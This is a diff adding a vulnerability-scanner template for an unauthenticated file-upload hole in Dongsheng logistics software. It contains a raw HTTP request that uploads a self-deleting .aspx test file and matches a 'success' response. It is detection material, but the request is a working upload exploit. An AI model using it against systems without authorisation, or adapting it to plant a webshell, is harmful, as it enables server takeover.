@@ -1,0 +1,43 @@
+id: dongshengsoft-GetLanesList-fileupload
+info:
+  name: 东胜物流软件 /SoftMng/FileInputHandler/Upload 文件上传漏洞
+  author: leadlife
+  severity: critical
+  description: 东胜物流系统是一款用于物流管理的系统。该系统的 /SoftMng/FileInputHandler/Upload 接口存在未授权的文件上传漏洞。攻击者可以通过该接口上传恶意文件（如webshell），从而获取服务器权限，导致系统安全受到严重威胁。
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/us5itr/nv7t72sogvvkzsrv
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips: | 
+      response 中包含 success:true 即为存在漏洞，另外可测试任意文件删除漏洞 https://www.yuque.com/lvguo-pibd8/us5itr/mr2rx5htd8gbu1mk
+    repair:
+    version:
+  tags: dongshengsoft,fileupload
+
+variables:
+    filename: "{{to_lower(rand_base(4))}}"
+    date: '{{date_time("%Y%M%D%H%M%S")}}'
+
+http:
+  - raw:
+      - |
+        POST /SoftMng/FileInputHandler/Upload HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+
+        ------WebKitFormBoundary7MA4YWxkTrZu0gW
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.aspx"
+        Content-Type: application/octet-stream
+
+        <%@Page Language="C#"%><%Response.Write("{{randstr}}");System.IO.File.Delete(Request.PhysicalPath);%>
+        ------WebKitFormBoundary7MA4YWxkTrZu0gW--
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'success','true')
+        condition: and
